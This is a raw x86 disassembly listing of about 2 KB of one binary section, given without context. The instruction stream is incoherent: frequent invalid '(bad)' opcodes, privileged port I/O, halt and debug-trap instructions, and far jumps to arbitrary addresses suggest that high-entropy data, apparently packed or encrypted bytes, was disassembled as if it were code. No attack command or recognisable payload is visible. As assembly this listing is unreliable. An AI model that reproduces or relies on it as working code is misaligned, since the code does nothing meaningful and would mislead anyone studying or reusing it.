  41da13:	sub    DWORD PTR [eax-0x1e5ce1ee],esi
  41da19:	mov    dh,0x3e
  41da1b:	(bad)  
  41da1c:	in     al,dx
  41da1d:	scas   eax,DWORD PTR es:[edi]
  41da1e:	push   edx
  41da1f:	pop    ecx
  41da20:	test   BYTE PTR [esi+eiz*2+0x47],cl
  41da24:	mov    WORD PTR [ebx+eax*2-0x7c],cs
  41da28:	jg     0x41da9a
  41da2a:	dec    ebp
  41da2b:	cld    
  41da2c:	scas   eax,DWORD PTR es:[edi]
  41da2d:	mov    WORD PTR [eax+0x7b],es
  41da30:	mov    ?,WORD PTR [ebx-0x73]
  41da33:	daa    
  41da34:	sub    ecx,DWORD PTR [edi-0x24]
  41da37:	inc    eax
  41da38:	in     eax,0xe0
  41da3a:	sbb    BYTE PTR [ebp-0x545910a8],0x4b
  41da41:	xor    DWORD PTR [ebx-0x3e1a1c78],edi
  41da47:	imul   esp,DWORD PTR [ebp+0x5f28c76c],0x707dbd6a
  41da51:	push   edi
  41da52:	pushf  
  41da53:	pop    edx
  41da55:	aad    0xda
  41da57:	daa    
  41da58:	out    0x0,al
  41da5a:	xchg   edi,eax
  41da5b:	or     DWORD PTR [edi-0x24],0xfffffffb
  41da5f:	sub    BYTE PTR fs:[edi],cl
  41da62:	(bad)
  41da66:	call   0x62589f24
  41da6b:	and    eax,0xcda3ab64
  41da70:	and    eax,0xbef01d72
  41da75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da76:	inc    esi
  41da77:	or     al,0x47
  41da79:	das    
  41da7a:	push   esp
  41da7b:	add    BYTE PTR [ebp+0x71cecfc0],dl
  41da81:	inc    eax
  41da82:	and    BYTE PTR [ebp-0x39],0x44
  41da86:	(bad)  
  41da87:	mov    dl,0x5f
  41da89:	lahf   
  41da8a:	xchg   ebp,eax
  41da8b:	pop    ebx
  41da8c:	cmp    ebp,eax
  41da8e:	not    BYTE PTR [eax]
  41da90:	or     eax,0xa800e7a9
  41da95:	sahf   
  41da96:	and    BYTE PTR [edi+ecx*8],dh
  41da99:	paddsw mm6,QWORD PTR [ecx]
  41da9c:	cmp    ch,BYTE PTR [ecx+0x20f493fe]
  41daa2:	or     eax,0xd3ed4cae
  41daa7:	scas   al,BYTE PTR es:[edi]
  41daa8:	or     DWORD PTR [esi],ecx
  41daaa:	les    ecx,FWORD PTR [esi]
  41daac:	jne    0x41da40
  41daae:	sbb    edx,ebp
  41dab0:	retf   
  41dab1:	lods   al,BYTE PTR ds:[esi]
  41dab2:	adc    DWORD PTR [edx+0x77d27759],0xa999d0d0
  41dabc:	pop    ecx
  41dabd:	sub    BYTE PTR [ebp-0x55],bh
  41dac0:	shr    DWORD PTR [eax-0x73],cl
  41dac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dac4:	and    eax,0xd5cf3810
  41dac9:	xor    ebp,0x75ef33cd
  41dacf:	aaa    
  41dad0:	inc    edx
  41dad1:	jb     0x41da54
  41dad3:	jmp    0x18ecab0e
  41dad8:	test   eax,0x470b00db
  41dadd:	jnp    0x41dac8
  41dadf:	loopne 0x41db55
  41dae1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dae2:	mov    cl,0xfa
  41dae4:	jo     0x41daa3
  41dae6:	in     eax,0x43
  41dae8:	cli    
  41dae9:	ror    BYTE PTR [edi],cl
  41daeb:	mov    esp,DWORD PTR [ebx]
  41daed:	data16 add BYTE PTR [eax],al
	...
  41db54:	add    BYTE PTR [eax],al
  41db56:	sbb    al,0x15
  41db58:	jnp    0x41dbad
  41db5a:	jnp    0x41dbdb
  41db5c:	cmp    al,0x5f
  41db5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db5f:	push   edi
  41db60:	sbb    ebp,0xffffff9b
  41db63:	pusha  
  41db64:	cmp    dl,BYTE PTR [edi+eiz*2]
  41db67:	aas    
  41db68:	add    DWORD PTR [eax],eax
  41db6a:	add    BYTE PTR [ecx],al
  41db6c:	add    BYTE PTR [eax],al
  41db6e:	and    DWORD PTR [eax],ecx
  41db70:	inc    edx
  41db71:	xchg   esi,eax
  41db72:	mov    eax,0xb596e872
  41db77:	bound  ebx,QWORD PTR [ebx-0x46]
  41db7a:	retf   0x5ac8
  41db7d:	adc    BYTE PTR [eax],dl
  41db7f:	mov    bl,0x18
  41db81:	js     0x41db8a
  41db83:	jp     0x41db5a
  41db85:	jno    0x41db63
  41db87:	out    dx,al
  41db88:	jb     0x41db86
  41db8a:	loop   0x41db53
  41db8c:	adc    DWORD PTR [eax+0x4c],esp
  41db8f:	cwde   
  41db90:	dec    ch
  41db92:	jmp    0x27532b18
  41db97:	and    ch,cl
  41db99:	lahf   
  41db9a:	pusha  
  41db9b:	jl     0x41dbc3
  41db9d:	jle    0x41db2a
  41db9f:	pop    esp
  41dba0:	cmp    al,0xec
  41dba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dba3:	ja     0x41dc01
  41dba5:	cmp    eax,0x62c8b2ec
  41dbaa:	mov    ah,0xf9
  41dbac:	ret    0xcbb9
  41dbaf:	mov    eax,ds:0x479bab04
  41dbb4:	sbb    DWORD PTR [ecx+0x32],ebp
  41dbb7:	fs ja  0x41dba9
  41dbba:	jg     0x41db90
  41dbbc:	mov    al,0xcf
  41dbbe:	dec    eax
  41dbbf:	fiadd  WORD PTR [esi]
  41dbc1:	push   esp
  41dbc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbc3:	retf   0x1373
  41dbc6:	call   0x340c:0xcbbaf0df
  41dbcd:	and    bl,bh
  41dbcf:	cmp    BYTE PTR [edi],bl
  41dbd1:	inc    ebp
  41dbd2:	and    cl,BYTE PTR [ebx+ecx*8]
  41dbd5:	dec    ah
  41dbd7:	es pop es
  41dbd9:	sbb    DWORD PTR [edx],0xffffffda
  41dbdc:	push   0x74
  41dbde:	pop    edx
  41dbdf:	sbb    ebp,DWORD PTR [esi+0x64b51f55]
  41dbe5:	lock adc ch,dh
  41dbe8:	adc    al,0x63
  41dbea:	popa   
  41dbeb:	mov    al,0xca
  41dbed:	sahf   
  41dbee:	sar    BYTE PTR [edi+0x174a71ab],1
  41dbf4:	and    ah,BYTE PTR [ebx]
  41dbf6:	pcmpeqd mm7,mm3
  41dbf9:	jno    0x41dbcd
  41dbfb:	bound  esi,QWORD PTR [ebx+edx*1+0x76]
  41dbff:	jp     0x41dc2c
  41dc01:	lds    eax,FWORD PTR [eax-0x503f1f9a]
  41dc07:	rol    BYTE PTR [edi-0x4f2ac77f],0x7d
  41dc0e:	mov    edi,0xbd04d2e5
  41dc13:	cmp    bh,ah
  41dc15:	adc    BYTE PTR [ebp-0x46],bh
  41dc18:	sub    ebx,eax
  41dc1a:	xchg   edi,eax
  41dc1b:	cmp    al,0xbd
  41dc1d:	xchg   DWORD PTR [ecx+0x1e],esi
  41dc20:	sbb    eax,0xe126f0ad
  41dc25:	popf   
  41dc26:	or     bl,BYTE PTR [ebp-0x64eb823c]
  41dc2c:	out    dx,eax
  41dc2d:	ins    BYTE PTR es:[edi],dx
  41dc2e:	mov    dh,0xb8
  41dc30:	pusha  
  41dc31:	push   0x1a11c956
  41dc36:	xor    BYTE PTR [ebx],0xed
  41dc39:	call   0x672a:0xc22e533c
  41dc40:	sub    esi,DWORD PTR [esi]
  41dc42:	mov    BYTE PTR [ebx+0x2a],al
  41dc45:	push   ds
  41dc46:	push   0x6d43a812
  41dc4b:	xor    esi,DWORD PTR [edi]
  41dc4d:	pop    edx
  41dc4e:	and    DWORD PTR [edx+eax*2-0xd],edx
  41dc52:	xchg   edi,eax
  41dc53:	push   ecx
  41dc54:	pop    ebp
  41dc55:	adc    eax,0xe18a966d
  41dc5a:	dec    edx
  41dc5b:	fisub  DWORD PTR [ecx+0x4b75d9da]
  41dc61:	fisubr WORD PTR [edi]
  41dc63:	sub    al,0x51
  41dc65:	push   es
  41dc66:	pop    ebx
  41dc67:	imul   ebp,DWORD PTR ds:0xef5ef48a,0xa8
	...
  41dcd5:	add    BYTE PTR [edi-0x36],ch
  41dcd8:	adc    eax,0xefdfb598
  41dcdd:	jmp    DWORD PTR [edi+0x12b0d050]
  41dce3:	out    0xfc,al
  41dce5:	sub    esp,DWORD PTR [edi+0x40]
  41dce8:	add    DWORD PTR [eax],eax
  41dcea:	add    BYTE PTR [ecx],al
  41dcec:	add    BYTE PTR [eax],al
  41dcee:	je     0x41dd25
  41dcf0:	jmp    0x9ccf:0x8abb097d
  41dcf7:	sub    ch,dl
  41dcf9:	and    BYTE PTR [eax-0x4a],0xb7
  41dcfd:	fwait
  41dcfe:	loopne 0x41dd56
  41dd00:	inc    edi
  41dd01:	neg    cl
  41dd03:	lahf   
  41dd04:	iret   
  41dd05:	cwde   
  41dd06:	stos   BYTE PTR es:[edi],al
  41dd07:	push   edi
  41dd08:	xor    bh,BYTE PTR [edi]
  41dd0a:	cmp    DWORD PTR [ebp-0x2f],esp
  41dd0d:	fadd   DWORD PTR [ebx]
  41dd0f:	(bad)  
  41dd10:	out    0x25,eax
  41dd12:	bt     ebx,edi
  41dd15:	jb     0x41dd8a
  41dd17:	leave  
  41dd18:	stos   BYTE PTR es:[edi],al
  41dd19:	jg     0x41dd8a
  41dd1b:	inc    ebx
  41dd1c:	stc    
  41dd1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd1e:	out    dx,eax
  41dd1f:	or     al,0xa
  41dd21:	push   0x40
  41dd23:	pushf  
  41dd24:	lods   eax,DWORD PTR ds:[esi]
  41dd25:	outs   dx,DWORD PTR ds:[esi]
  41dd26:	test   al,0x7d
  41dd28:	addr16 popf 
  41dd2a:	mov    dh,0xa8
  41dd2c:	(bad)  
  41dd2d:	shl    DWORD PTR [esi+ecx*2-0x12],cl
  41dd31:	ror    DWORD PTR [esi+0x22],0x2f
  41dd35:	push   eax
  41dd36:	sub    bl,BYTE PTR [ecx+0x5fa8aa56]
  41dd3c:	sub    eax,0xa6b2cc1a
  41dd41:	mov    edi,0x7ea5b9a6
  41dd46:	test   al,0xfb
  41dd48:	imul   edi,DWORD PTR [edx-0x3bb6ca6c],0xffffffeb
  41dd4f:	xor    dh,cl
  41dd51:	jmp    0xfa8e8dd8
  41dd56:	nop
  41dd57:	in     al,dx
  41dd58:	mov    eax,0x7b69e6
  41dd5d:	mov    eax,0xc26659b9
  41dd62:	adc    BYTE PTR [ecx],cl
  41dd64:	std    
  41dd65:	add    BYTE PTR [esi+0x1e],cl
  41dd68:	push   esi
  41dd69:	xor    DWORD PTR [esi],ebx
  41dd6b:	mov    edx,0x50610aa5
  41dd70:	xor    DWORD PTR [edi],esi
  41dd72:	mov    ebx,0x91a40c94
  41dd77:	(bad)  
  41dd78:	not    BYTE PTR [ebx]
  41dd7a:	or     ah,dh
  41dd7c:	mov    edi,0x3624df25
  41dd81:	push   ds
  41dd82:	cs jo  0x41ddb3
  41dd85:	inc    ebx
  41dd86:	(bad)  
  41dd87:	mov    esi,0x2381c34c
  41dd8c:	hlt    
  41dd8d:	jo     0x41ddc0
  41dd8f:	cmp    ebx,ecx
  41dd91:	jg     0x41dda1
  41dd93:	cmc    
  41dd94:	pop    ss
  41dd95:	pushf  
  41dd96:	jl     0x41dd40
  41dd98:	stos   BYTE PTR es:[edi],al
  41dd99:	adc    al,BYTE PTR [ebx]
  41dd9b:	add    DWORD PTR [eax],esp
  41dd9d:	push   0xdbb4f79c
  41dda2:	scas   eax,DWORD PTR es:[edi]
  41dda3:	mov    bl,0x27
  41dda5:	sbb    al,0x34
  41dda7:	push   eax
  41dda8:	cs out dx,eax
  41ddaa:	pop    ecx
  41ddab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddac:	jl     0x41de25
  41ddae:	adc    al,0xfb
  41ddb0:	and    edi,DWORD PTR [ecx]
  41ddb2:	int    0xd
  41ddb4:	(bad)  
  41ddb5:	xor    BYTE PTR [esi],dl
  41ddb7:	or     cl,BYTE PTR [ecx]
  41ddb9:	xchg   esi,eax
  41ddba:	pushf  
  41ddbb:	jge    0x41dd45
  41ddbd:	xor    eax,0x95b75172
  41ddc2:	mov    edx,0x9a2cb97b
  41ddc7:	adc    BYTE PTR [edx+esi*2+0x78],dh
  41ddcb:	mov    ss,WORD PTR [ebp-0x3d]
  41ddce:	ror    BYTE PTR [ebx+ecx*8+0x7b],cl
  41ddd2:	in     eax,0x36
  41ddd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddd5:	push   esp
  41ddd6:	gs ds scas al,BYTE PTR es:[edi]
  41ddd9:	jae    0x41dd83
  41dddb:	enter  0xf709,0xec
  41dddf:	aaa    
  41dde0:	cwde   
  41dde1:	sahf   
  41dde2:	push   eax
  41dde3:	ss xchg eax,ebp
  41dde6:	add    edx,DWORD PTR [esi-0x9cdedf]
  41ddec:	jae    0x41dd95
	...
  41de56:	and    bl,dh
  41de58:	das    
  41de59:	cmp    bh,0xde
  41de5c:	lods   eax,DWORD PTR ds:[esi]
  41de5d:	repz pop ds
  41de5f:	mov    bl,BYTE PTR [esi-0x41]
  41de62:	and    al,bh
  41de64:	push   0xffffffec
  41de66:	addr16 inc ecx
  41de68:	add    DWORD PTR [eax],eax
  41de6a:	add    BYTE PTR [ecx],al
  41de6c:	add    BYTE PTR [eax],al
  41de6e:	(bad)  
  41de70:	xchg   ebx,eax
  41de71:	imul   esp,esi,0x3a
  41de74:	inc    eax
  41de75:	pop    esi
  41de76:	mov    ebp,0x3396de5d
  41de7b:	adc    al,0xa6
  41de7d:	sub    al,BYTE PTR [eax-0x51]
  41de80:	jg     0x41deea
  41de82:	push   eax
  41de83:	mov    al,ds:0x62bf99d5
  41de88:	sahf   
  41de89:	sbb    ebx,ebx
  41de8b:	or     bh,BYTE PTR [esi-0x1d]
  41de8e:	dec    edi
  41de8f:	int    0x9d
  41de91:	in     eax,0xee
  41de93:	or     esp,DWORD PTR [ebx]
  41de95:	or     eax,0x9d2208ba
  41de9a:	scas   eax,DWORD PTR es:[edi]
  41de9b:	xor    esp,0x244db25c
  41dea1:	push   edi
  41dea2:	call   0x20f9ea57
  41dea7:	xchg   BYTE PTR [ecx+0x74],al
  41deaa:	ins    DWORD PTR es:[edi],dx
  41deab:	jb     0x41ded8
  41dead:	or     DWORD PTR [edx-0x5c],esp
  41deb0:	adc    al,0xd3
  41deb2:	mov    esi,0x10a8806c
  41deb7:	mov    BYTE PTR [eax+0x4f14b292],cl
  41debd:	lock out dx,al
  41debf:	shl    DWORD PTR [edx+edi*2+0xb022b06],1
  41dec6:	mov    cs,WORD PTR [ecx-0x7e]
  41dec9:	jg     0x41deb0
  41decb:	shl    BYTE PTR [ebp+0x4],1
  41dece:	pop    es
  41decf:	rol    BYTE PTR [eax+0x5],1
  41ded2:	mov    ds:0x6616fd14,al
  41ded7:	jnp    0x41de93
  41ded9:	rcl    DWORD PTR [eax-0x1e7d7c47],cl
  41dedf:	imul   edi,ebp,0xffffffaa
  41dee2:	sbb    eax,0xa057239e
  41dee7:	dec    edi
  41dee8:	jo     0x41deb5
  41deea:	sub    al,0x70
  41deec:	fdivr  DWORD PTR [eax+0xc37e4a2]
  41def2:	mov    esp,0x4fdf1b92
  41def7:	pop    ebx
  41def8:	mov    dl,0x4a
  41defa:	(bad)  
  41defb:	mov    ebp,0xccda9145
  41df00:	icebp  
  41df01:	mov    cl,0x2e
  41df03:	inc    eax
  41df04:	pushf  
  41df05:	and    dh,BYTE PTR [ebx+0x19]
  41df08:	gs mov esp,0xf726409a
  41df0e:	cmp    eax,0xaecc754e
  41df13:	out    dx,eax
  41df14:	or     edx,esi
  41df16:	sub    eax,0x4c39c773
  41df1b:	push   0xbc855902
  41df20:	jo     0x41df0d
  41df22:	jle    0x41df1b
  41df24:	push   eax
  41df25:	sti    
  41df26:	jb     0x41df82
  41df28:	jno    0x41df08
  41df2a:	xchg   edx,eax
  41df2b:	imul   esi,esp,0x2b
  41df2e:	ins    DWORD PTR es:[edi],dx
  41df2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df30:	pop    esp
  41df31:	adc    DWORD PTR [ebx],esi
  41df33:	rcr    BYTE PTR [ebx],cl
  41df35:	ror    BYTE PTR [edi+0x2937b4e7],cl
  41df3b:	sti    
  41df3c:	cs into 
  41df3e:	dec    esp
  41df3f:	fs xchg esp,eax
  41df41:	push   es
  41df42:	mov    BYTE PTR [ebp-0x1e3b2eed],dh
  41df48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df49:	icebp  
  41df4a:	clc    
  41df4b:	test   DWORD PTR [ebx*4-0x7a27a53a],ebx
  41df52:	xchg   edx,eax
  41df53:	je     0x41defb
  41df55:	mov    ?,WORD PTR [edi-0x66]
  41df58:	clc    
  41df59:	int    0xdd
  41df5b:	push   cs
  41df5c:	mov    ds:0x2c5fe8f6,al
  41df61:	mov    ds:0xa2113446,al
  41df66:	push   ebp
  41df67:	jg     0x41df5c
  41df69:	dec    edx
  41df6a:	add    BYTE PTR [esi+0xad2e],ch
	...
  41dfd4:	add    BYTE PTR [eax],al
  41dfd6:	aas    
  41dfd7:	daa    
  41dfd8:	push   ss
  41dfd9:	cld    
  41dfda:	push   ds
  41dfdb:	std    
  41dfdc:	jmp    edi
  41dfde:	dec    edi
  41dfdf:	push   0xc13d9ce9
  41dfe4:	popf   
  41dfe5:	jnp    0x41e04e
  41dfe7:	inc    edx
  41dfe8:	add    DWORD PTR [eax],eax
  41dfea:	add    BYTE PTR [ecx],al
  41dfec:	add    BYTE PTR [eax],al
  41dfee:	xchg   esi,eax
  41dfef:	pop    ss
  41dff0:	iret   
  41dff1:	icebp  
  41dff2:	xchg   DWORD PTR [ebx-0x233d5caf],ebx
  41dff8:	(bad)  
  41dff9:	mov    ch,0x34
  41dffb:	jp     0x41dffc
  41dffd:	imul   edi,DWORD PTR [ebp-0x406999d6],0xb949c614
  41e007:	xor    DWORD PTR [edx],esi
  41e009:	push   edi
  41e00a:	int    0x70
  41e00c:	cmp    BYTE PTR fs:[esi+0x32],ah
  41e010:	shr    DWORD PTR [esi+0x59dc6665],1
  41e016:	inc    ebp
  41e017:	inc    ecx
  41e018:	sti    
  41e019:	pop    ds
  41e01a:	push   cs
  41e01b:	add    BYTE PTR [ebx+ecx*2],bh
  41e01e:	outs   dx,BYTE PTR ds:[esi]
  41e01f:	push   0x20
  41e021:	adc    al,BYTE PTR [esi]
  41e023:	jno    0x41dfcf
  41e025:	aam    0x2d
  41e027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e028:	xor    eax,0x9c0d1f99
  41e02d:	or     DWORD PTR [esi],0xffffffd6
  41e030:	ret    0x7215
  41e033:	in     eax,0x93
  41e035:	and    bh,bl
  41e037:	adc    BYTE PTR [ebx],0xbb
  41e03a:	or     eax,ecx
  41e03c:	pop    ss
  41e03d:	shr    BYTE PTR [esi+0x66],cl
  41e040:	cwde   
  41e041:	adc    eax,0x408b7d2e
  41e046:	push   edx
  41e047:	test   cl,dh
  41e049:	ret    
  41e04a:	add    eax,0xe0353cd2
  41e04f:	push   ebp
  41e050:	outs   dx,DWORD PTR gs:[esi]
  41e052:	lds    eax,FWORD PTR [eax]
  41e054:	pop    es
  41e055:	xchg   esp,eax
  41e056:	mov    DWORD PTR [esi-0x41],ecx
  41e059:	mov    bh,0xf4
  41e05b:	fwait
  41e05c:	xchg   DWORD PTR [ebx+0x36],esi
  41e05f:	clc    
  41e060:	shl    DWORD PTR [esi],cl
  41e062:	and    DWORD PTR [edx+esi*8+0x75446799],eax
  41e069:	or     ecx,edi
  41e06b:	xchg   esi,eax
  41e06c:	arpl   sp,bp
  41e06e:	push   0xffffffb8
  41e070:	scas   eax,DWORD PTR es:[edi]
  41e071:	jp     0x41e01f
  41e073:	in     eax,dx
  41e074:	mov    WORD PTR [edx+0x17],ds
  41e077:	nop
  41e078:	xor    DWORD PTR [esi-0x6d1effba],esp
  41e07e:	aam    0x5b
  41e080:	xchg   esi,eax
  41e081:	push   esi
  41e082:	mov    ecx,0xe7900063
  41e087:	sub    eax,DWORD PTR [ecx]
  41e089:	and    esp,DWORD PTR [esi]
  41e08b:	mov    al,0x86
  41e08d:	mov    edi,DWORD PTR [ecx]
  41e08f:	xor    edx,DWORD PTR [esi-0x3ffb5dda]
  41e095:	mov    bl,0x73
  41e097:	xchg   ebx,eax
  41e098:	push   es
  41e099:	neg    BYTE PTR [ebx+0x2f48d46f]
  41e09f:	xchg   esp,eax
  41e0a0:	gs scas eax,DWORD PTR es:[edi]
  41e0a2:	sub    eax,0x75f0ad66
  41e0a7:	adc    eax,0x62a23a99
  41e0ac:	fisubr WORD PTR ds:0xe92a0d53
  41e0b2:	pop    ebp
  41e0b3:	ficomp DWORD PTR [ebx-0x6a]
  41e0b6:	std    
  41e0b7:	sub    ch,ch
  41e0b9:	aam    0x5f
  41e0bb:	lea    ebx,[ebp+0x7c]
  41e0be:	outs   dx,DWORD PTR ds:[esi]
  41e0bf:	js     0x41e0d1
  41e0c1:	fstp   QWORD PTR [edi+0x6eb89da9]
  41e0c7:	jnp    0x41e10d
  41e0c9:	and    dl,BYTE PTR [esi+0x22089981]
  41e0cf:	and    ebp,ebx
  41e0d1:	adc    BYTE PTR [ebp+0x65b965e0],ah
  41e0d7:	es xchg esi,eax
  41e0d9:	xor    ch,0x5d
  41e0dc:	neg    DWORD PTR [esp+edx*8]
  41e0df:	adc    eax,ebp
  41e0e1:	dec    ecx
  41e0e2:	sti    
  41e0e3:	lahf   
  41e0e4:	jmp    0x41e076
  41e0e6:	clc    
  41e0e7:	add    eax,0xf44a4161
  41e0ec:	jg     0x41e14b
	...
  41e156:	dec    edi
  41e157:	push   ebx
  41e158:	add    al,0xc
  41e15a:	sbb    al,0x5f
  41e15c:	dec    edi
  41e15d:	push   ebx
  41e15e:	out    0x6d,eax
  41e160:	aad    0x48
  41e162:	dec    esp
  41e163:	inc    eax
  41e164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e165:	adc    esp,DWORD PTR [edi+0x43]
  41e168:	add    DWORD PTR [eax],eax
  41e16a:	add    BYTE PTR [ecx],al
  41e16c:	add    BYTE PTR [eax],al
  41e16e:	out    0xa3,eax
  41e170:	inc    ecx
  41e171:	and    al,0x92
  41e173:	leave  
  41e174:	in     eax,dx
  41e175:	inc    ebx
  41e176:	lock xor eax,0x2ad78215
  41e17c:	jmp    0x41e1d8
  41e17e:	adc    ebp,DWORD PTR [edx-0x6d]
  41e181:	push   es
  41e182:	ins    DWORD PTR es:[edi],dx
  41e183:	in     eax,dx
  41e184:	psraw  mm7,QWORD PTR [eax+0x2399f9ca]
  41e18b:	retf   0x951
  41e18e:	aas    
  41e18f:	lods   al,BYTE PTR ds:[esi]
  41e190:	add    dl,BYTE PTR [edx+0x36aaa32b]
  41e196:	push   ds
  41e197:	sbb    bh,BYTE PTR [edx+0x32]
  41e19a:	sub    BYTE PTR [ebp-0xb],bl
  41e19d:	jmp    FWORD PTR [ebp-0x67]
  41e1a0:	shl    edx,0x20
  41e1a3:	sbb    eax,ecx
  41e1a5:	xor    ebx,edi
  41e1a7:	push   0xc0ef2695
  41e1ac:	jmp    0x3422b417
  41e1b1:	mov    ah,0xea
  41e1b3:	repnz push DWORD PTR ds:0xb8757c84
  41e1ba:	xchg   esi,eax
  41e1bb:	adc    ecx,DWORD PTR [edi]
  41e1bd:	mov    bh,0xca
  41e1bf:	mov    edi,0x6f47a35a
  41e1c4:	jmp    0xd303feff
  41e1c9:	pop    es
  41e1ca:	pushf  
  41e1cb:	pop    es
  41e1cc:	push   ebx
  41e1cd:	cli    
  41e1ce:	pop    ds
  41e1cf:	dec    esp
  41e1d0:	lock mov BYTE PTR [eax],0x4c
  41e1d4:	shr    edx,0xf9
  41e1d7:	in     al,dx
  41e1d8:	jl     0x41e19e
  41e1da:	and    al,0xa6
  41e1dc:	outs   dx,BYTE PTR ds:[esi]
  41e1dd:	cmc    
  41e1de:	imul   eax,DWORD PTR [ebx+0x1e],0x67
  41e1e2:	or     BYTE PTR [ebx-0x71],0x56
  41e1e6:	imul   esp,ecx,0xffffff90
  41e1e9:	sar    BYTE PTR [esi-0x70],cl
  41e1ec:	ins    DWORD PTR es:[edi],dx
  41e1ed:	cmp    al,0x49
  41e1ef:	adc    ch,BYTE PTR [edx-0x1d]
  41e1f2:	loopne 0x41e1a6
  41e1f4:	cmp    DWORD PTR [ecx-0x4d],ecx
  41e1f7:	adc    eax,0x33be0dfe
  41e1fc:	ins    DWORD PTR es:[edi],dx
  41e1fd:	cmp    DWORD PTR [ecx],edi
  41e1ff:	je     0x41e1e8
  41e201:	into   
  41e202:	sub    ecx,0xffffffc5
  41e205:	enter  0x9389,0xb4
  41e209:	leave  
  41e20a:	rcr    BYTE PTR [ebx-0x42],0xb5
  41e20e:	mov    ds:0xf30cdca8,al
  41e213:	add    ch,BYTE PTR [esp+esi*1+0x25]
  41e217:	(bad)  
  41e218:	push   esp
  41e219:	pop    edi
  41e21a:	mov    cl,0x64
  41e21c:	psubusw mm0,QWORD PTR [eax+0x4ffe3570]
  41e223:	xchg   BYTE PTR [ecx+edx*2-0x306c0497],al
  41e22a:	jns    0x41e22e
  41e22c:	add    DWORD PTR [ecx+0x78],ebx
  41e22f:	les    eax,FWORD PTR [ebx+0xf]
  41e232:	sbb    al,BYTE PTR gs:[ebx]
  41e235:	xor    edx,DWORD PTR [edi+eax*1-0x6c]
  41e239:	mov    WORD PTR [eax],ds
  41e23b:	jmp    0x7327:0x1ebaa223
  41e242:	xor    DWORD PTR es:[ebx-0x73],esi
  41e246:	outs   dx,BYTE PTR ds:[esi]
  41e247:	repnz adc al,0xc3
  41e24a:	(bad)  
  41e24c:	sub    esi,DWORD PTR [esi]
  41e24e:	scas   eax,DWORD PTR es:[edi]
  41e24f:	mov    esp,cs
  41e251:	data16 aas 
  41e253:	xchg   BYTE PTR [edi-0x4779b603],ch
  41e259:	push   ecx
  41e25a:	mov    bl,0x97
  41e25c:	mov    ah,0x55
  41e25e:	xchg   esp,eax
  41e25f:	add    DWORD PTR [ebx],esp
  41e261:	xchg   ebp,eax
  41e262:	mov    BYTE PTR [ebp-0x10],bh
  41e265:	xchg   DWORD PTR [esi+0x58],ebp
  41e268:	jns    0x41e225
  41e26a:	enter  0xe01d,0xe4
	...
  41e2d6:	stos   DWORD PTR es:[edi],eax
  41e2d7:	add    dh,BYTE PTR [edi-0x1a]
  41e2da:	push   edi
  41e2dc:	mov    ebx,0x6f64c34f
  41e2e1:	or     al,0x6d
  41e2e3:	mov    eax,ds:0x4467c197
  41e2e8:	add    DWORD PTR [eax],eax
  41e2ea:	add    BYTE PTR [ecx],al
  41e2ec:	add    BYTE PTR [eax],al
  41e2ee:	adc    ah,BYTE PTR [ebx-0x12f37fdc]
  41e2f4:	sub    eax,0xae4924ad
  41e2f9:	leave  
  41e2fa:	ss inc ecx
  41e2fc:	dec    ebp
  41e2fd:	sub    DWORD PTR [edi],edx
  41e2ff:	ins    BYTE PTR es:[edi],dx
  41e300:	js     0x41e376
  41e302:	sub    BYTE PTR [esi-0x60],dl
  41e305:	mov    BYTE PTR [ecx],dh
  41e307:	mov    eax,0x5de7738b
  41e30c:	mov    esp,0x39ffa231
  41e311:	inc    ecx
  41e312:	(bad)  
  41e315:	inc    ecx
  41e316:	pop    edi
  41e317:	jmp    0x41e2c7
  41e319:	bound  eax,QWORD PTR [edx]
  41e31b:	cbw    
  41e31d:	in     eax,0xe0
  41e31f:	push   ebp
  41e320:	(bad)  
  41e321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e322:	jbe    0x41e31f
  41e324:	inc    ecx
  41e325:	mov    ebx,0xc9ab41eb
  41e32a:	cs jp  0x41e341
  41e32d:	mov    al,ds:0xe114acd2
  41e332:	fnstsw WORD PTR [eax+edx*2]
  41e335:	jnp    0x41e2d7
  41e337:	mov    ebx,eax
  41e339:	or     al,0x57
  41e33b:	dec    ebx
  41e33c:	stos   DWORD PTR es:[edi],eax
  41e33d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e33e:	int    0xe4
  41e340:	(bad)  
  41e341:	addr16 cli 
  41e343:	push   ebp
  41e344:	addr16 xchg esi,eax
  41e346:	xor    al,0xba
  41e348:	jne    0x41e38c
  41e34a:	and    ah,BYTE PTR [ecx]
  41e34c:	mov    esi,0x47cd74d
  41e351:	shl    dl,cl
  41e353:	test   eax,0x7069bc9b
  41e358:	push   0xfffffffb
  41e35a:	pop    esp
  41e35b:	(bad)  
  41e35c:	pop    ecx
  41e35d:	fild   WORD PTR [esi+0x21]
  41e360:	gs jne 0x41e348
  41e363:	ds aaa 
  41e365:	mov    edi,0x857ef2c5
  41e36a:	adc    al,0x22
  41e36c:	cld    
  41e36d:	outs   dx,BYTE PTR ds:[esi]
  41e36e:	out    0x17,eax
  41e370:	or     ebx,DWORD PTR [edi+0x60]
  41e373:	mov    eax,ds:0x242fd227
  41e378:	push   cs
  41e379:	cmp    al,0x13
  41e37b:	retf   0xd273
  41e37e:	sbb    eax,0xe91640ec
  41e383:	mov    ?,WORD PTR [ecx+0x34]
  41e386:	ins    BYTE PTR es:[edi],dx
  41e387:	addr16 mov ecx,0x6f09839e
  41e38d:	and    ebp,esi
  41e38f:	test   eax,0xd277421f
  41e394:	popf   
  41e395:	and    edi,DWORD PTR [edi+edi*4+0x4143b69]
  41e39c:	or     al,BYTE PTR [ebx]
  41e39e:	lea    eax,[ebx]
  41e3a0:	sub    eax,0x52f9a402
  41e3a5:	in     al,dx
  41e3a6:	ret    0x685f
  41e3a9:	(bad)  
  41e3aa:	and    DWORD PTR [ebx],esp
